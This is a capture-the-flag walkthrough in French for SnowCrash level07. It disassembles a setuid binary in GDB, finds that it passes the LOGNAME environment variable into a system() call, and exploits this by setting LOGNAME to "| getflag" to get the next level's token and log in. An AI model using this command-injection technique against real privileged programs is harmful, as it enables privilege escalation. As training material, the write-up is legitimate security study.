# 07 - Binary exploit: environnement

- On se connecte en tant que level07.
```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

```
level07@SnowCrash:~$ ./level07
level07
```


- Un binaire nous a été laissé. Examinons-le de plus près avec [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
```
(gdb) info functions
All defined functions:

File /home/user/level07/level07.c:
int main(int, char **, char **);

Non-debugging symbols:
0x08048384  _init
...
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048514 <+0>:     push   %ebp
   0x08048515 <+1>:     mov    %esp,%ebp
   0x08048517 <+3>:     and    $0xfffffff0,%esp
   0x0804851a <+6>:     sub    $0x20,%esp
   0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:    mov    %eax,0x18(%esp)
   0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:    mov    %eax,0x1c(%esp)
   0x0804852f <+27>:    mov    0x18(%esp),%eax
   0x08048533 <+31>:    mov    %eax,0x8(%esp)
   0x08048537 <+35>:    mov    0x18(%esp),%eax
   0x0804853b <+39>:    mov    %eax,0x4(%esp)
   0x0804853f <+43>:    mov    0x18(%esp),%eax
   0x08048543 <+47>:    mov    %eax,(%esp)
   0x08048546 <+50>:    call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:    mov    0x1c(%esp),%eax
   0x0804854f <+59>:    mov    %eax,0x8(%esp)
   0x08048553 <+63>:    mov    0x1c(%esp),%eax
   0x08048557 <+67>:    mov    %eax,0x4(%esp)
   0x0804855b <+71>:    mov    0x1c(%esp),%eax
   0x0804855f <+75>:    mov    %eax,(%esp)
   0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:    movl   $0x0,0x14(%esp)
   0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt>
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>
   0x0804859f <+139>:   leave
   0x080485a0 <+140>:   ret
End of assembler dump.
```


- Le programme appelle `<getenv@plt>` après avoir déplacé l'adresse `0x8048680` au sommet de la stack.
```
(gdb) x/s 0x8048680
0x8048680:       "LOGNAME"
```


- `<getenv@plt>` va sauvegarder la valeur de la variable d'environnement `LOGNAME` dans le registre `eax`, et cette valeur sera passée en paramètre à la fonction `<asprintf@plt>`. Ensuite, l'adresse `0x8048688` sera également déplacée au sommet de la stack pour être utilisée par `<asprintf@plt>`.
```
(gdb) x/s 0x8048688
0x8048688:       "/bin/echo %s"
```


- `<asprintf@plt>` stockera dans le registre `eax` l'adresse pointant vers la chaîne `/bin/echo %s`, où `%s` sera remplacé par la valeur de la variable d'environnement `LOGNAME`. Le résultat sera executé par `<system@plt>`, du coup:
```
level07@SnowCrash:~$ export LOGNAME="| getflag"
```

```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

```
level07@SnowCrash:~$ su level08
Password:fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$
```